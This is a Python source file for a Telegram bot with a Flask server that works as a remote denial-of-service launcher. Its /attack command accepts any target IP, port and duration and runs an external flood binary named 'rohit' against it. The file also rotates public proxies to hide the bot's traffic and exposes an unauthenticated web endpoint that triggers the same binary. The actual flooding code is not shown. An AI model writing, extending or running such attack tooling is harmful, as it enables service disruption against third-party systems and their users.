import os
import telebot
import logging
import subprocess
import random
import time
from threading import Thread
from flask import Flask

# Configuration
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")  # Fetch token from environment variable
if not TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set!")
bot = telebot.TeleBot(TOKEN)
CHANNEL_ID = -1002188746287

# Logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Flask app
app = Flask(__name__)

@app.route('/')
def hello_world():
    return "Hello, World!"

@app.route('/run_c_code')
def run_c_code():
    try:
        result = subprocess.run(["./rohit", "192.168.0.1", "12345", "60", "4"], capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        logging.error(f"Error running C code: {e}")
        return f"Error: {e}"

# Proxy Update
def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678",
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

# Binary Runner
def run_binary(ip, port, duration):
    try:
        subprocess.run(["./rohit", ip, str(port), str(duration), '100'], check=True)
    except Exception as e:
        logging.error(f"Error running binary: {e}")

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    bot.send_message(message.chat.id, "*💣 Ready to launch an attack?*\nProvide the target IP, port, and duration in seconds.", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "Invalid format. Use: `/attack IP PORT DURATION`", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"Port {target_port} is blocked.", parse_mode='Markdown')
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "Maximum duration is 599 seconds.", parse_mode='Markdown')
            return

        run_binary(target_ip, target_port, duration)
        bot.send_message(message.chat.id, f"Attack launched on {target_ip}:{target_port} for {duration} seconds!", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(message.chat.id, "An error occurred while processing your request.", parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.send_message(message.chat.id, "Use `/attack IP PORT DURATION` to launch an attack. `/help` for assistance.", parse_mode='Markdown')

# Thread Runner
def run_flask():
    try:
        logging.info("Starting Flask server...")
        app.run(host="0.0.0.0", port=5000)
    except Exception as e:
        logging.error(f"Flask server error: {e}")

def run_telegram_bot():
    try:
        logging.info("Starting Telegram bot...")
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Telegram Bot Error: {e}")
        time.sleep(REQUEST_INTERVAL)  # Retry after a short delay

if __name__ == '__main__':
    # Start Flask server in a separate thread
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Start Telegram bot in the main thread
    run_telegram_bot()
